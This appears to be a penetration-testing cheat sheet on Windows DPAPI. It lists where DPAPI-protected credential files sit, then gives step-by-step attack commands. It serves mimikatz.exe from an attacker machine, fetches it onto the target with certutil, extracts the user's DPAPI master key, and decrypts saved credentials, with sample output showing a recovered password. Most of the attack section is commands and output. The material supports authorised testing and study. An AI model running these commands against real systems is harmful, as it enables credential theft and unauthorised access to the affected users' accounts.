# DPAPI

The **Data Protection API** (DPAPI) is a **built-in feature** of the Windows operating system that enables applications to securely store sensitive data, such as **passwords**. \
This information is saved within the **userâ€™s profile directory** and is protected using **user-specific master keys**, which are derived from the user's password.&#x20;

These protected files are typically found at:

```powershell
C:\Users\$USER\AppData\Roaming\Microsoft\Protect\$SUID\$GUID
```

Several applications (Google Chrome, Outlook, Internet Explorer, and Skype) utilize DPAPI to safeguard sensitive information. \
Windows itself also relies on DPAPI to store items like Wi-Fi passwords, digital certificates, Remote Desktop credentials, and more.

Common locations where DPAPI-encrypted data may be stored include:

```powershell
C:\Users\$USER\AppData\Local\Microsoft\Credentials\
C:\Users\$USER\AppData\Roaming\Microsoft\Credentials\
```



## DPAPI with Mimikatz (Windows)

Transfer the `mimikatz.exe` into Windows target system.

```bash
# attack machine
cp /usr/share/windows-resources/mimikatz/x64/mimikatz.exe .
python3 -m http.server 80

# target machine
certutil -urlcache -f http://$IP/mimikatz.exe mimi.exe
```

### Get DPAPI MasterKey

First things first, we have to obtain the masterkey by extracting and decryping it.

View the enable masterkeys to dencrypts:

```
dir C:\Users\$USER\AppData\Roaming\Microsoft\Protect\$SID\
```

{% code title="mimikatz.exe dpapi::masterkey" overflow="wrap" %}
```powershell
.\mimikatz.exe 'dpapi::masterkey /in:"C:\Users\$USER\AppData\Roaming\Microsoft\Protect\$SID\$GUID" /sid:$SID /password:$USER_PASSWORD /protected' exit
```
{% endcode %}

{% embed url="https://tools.thehacker.recipes/mimikatz/modules/dpapi/masterkey" %}

{% code title="Output" overflow="wrap" %}
```
[...snip...]
[masterkey] with password: Password123! (protected user)
  key : MASTERKEY_TO_COPY
  sha1: MASTERKEY_SHA1
```
{% endcode %}



### Decrypt DPAPI saved creds

With the MasterKey we can decrypt the protected files.

{% code title="mimikatz.exe dpapi::cred " overflow="wrap" %}
```powershell
.\mimikatz.exe 'dpapi::cred /in:"C:\Users\$USER\AppData\Roaming\Microsoft\Credentials\$PROTECTED_FILE" /masterkey:$MASTERKEY' exit
```
{% endcode %}

{% embed url="https://tools.thehacker.recipes/mimikatz/modules/dpapi/cred" %}



## Resources

{% embed url="https://www.thehacker.recipes/ad/movement/credentials/dumping/dpapi-protected-secrets" %}
